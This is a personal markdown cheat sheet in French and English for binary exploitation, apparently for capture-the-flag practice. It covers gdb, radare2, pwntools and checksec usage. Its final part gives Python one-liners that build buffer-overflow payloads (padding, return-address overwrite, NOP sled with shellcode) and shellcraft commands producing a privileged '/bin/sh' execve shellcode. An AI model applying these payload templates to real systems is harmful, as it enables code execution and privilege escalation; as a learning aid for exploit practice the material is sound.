
|**Name** | **Descrption**|
|---------|---------------|
| `gdb` | binary exploit |
| `pwndbg` | extention for gdb |
| `pwntools` | python module |
| `patchelf` |  |
| `pwninit` | to patch an executable |
| `ROPgadget` | |
| `ropper` | afficher des informations utiles sur les fichiers binaires |
| `radare2` | désassembleur, un débogueur et un outil d'analyse binaire |
| `nm` | pareil que r2 |
| `cyclic` | genère une chaine de caractères |
|`msf-pattern_creat` | |
| `checksec` | show binary info |
| `shellcraft` | créeation de shellcode |


| `checksec exeName` | show executable protection info |
# r2
```
r2 -d <binarie>
> aaa # scan binarie
> afl # show functions
> pdf @<function>
```
# ***gdb***
```
gdb exeName
pwndbg> r # run the programm
pwndbg> r < textFile # add an input from a text file
pwndbg> info functions # affiche les fonctions du binaire
```

## ***cyclic***
| `cyclic 100 > textFile` | add 100 char in a textFile |
# ***pwninit***
| `pwninit` | execut it in exefile directory |

# ***rabin2***
Lister uniquement les fonctions écrites par le programmeur
```
rabin2 -qs <binary> && grep -ve imp -e ' 0 '
```
| `rabin2 -i <binary>` | Lister les fonctions importées à partir de bibliothèques partagées |
| `rabin2 -z split` | affiche toutes des chaînes que le programmeur a délibérément placées dans le binaire |
|-----------------|------------------|
# ***nm***
| `nm  && grep ' t '` | vérifier les noms de méthodes (plus préci que r2)|

# ***payload with python***
create x32 payloads
```
python3 -c "import sys;import pwn;sys.stdout.buffer.write(b'A'*<offset>+pwn.p32(0xdeedbeaf))" > payload
```
```
python3 -c "import sys;sys.stdout.buffer.write(b'A'*<offset>+b'\xaf\xbe\xed\xde')" > payload
```

| `python3 -c "import sys;import pwn;sys.stdout.buffer.write(pwn.cyclic(<offset>)+pwn.p32(<&ESP>+200)+b'\x90'*1000+b'<shellcode>')" > attack` |creat payload with shellcode (check message "Trace/breakpoint trap" in gdb)  |
# *shellcraft* 
| `shellcraft <arch>.<os>.<cmd> -f s` | imprimera le shellcode au format chaine ex : shellcraft i386.linux.sh -f s|
 imprimera le shellcode au format chaine avec les arguments de la commande ex : shellcraft i386.linux.execve "/bin///sh" "['sh', '-p']" -f s |
 
```
 shellcraft i386.linux.execve "/path///<cmd>" "['<cmd>', '<cmd's arg>']" -f s
```

```
 shellcraft i386.linux.execve "/bin///sh" "['sh', '-p']" -f s
```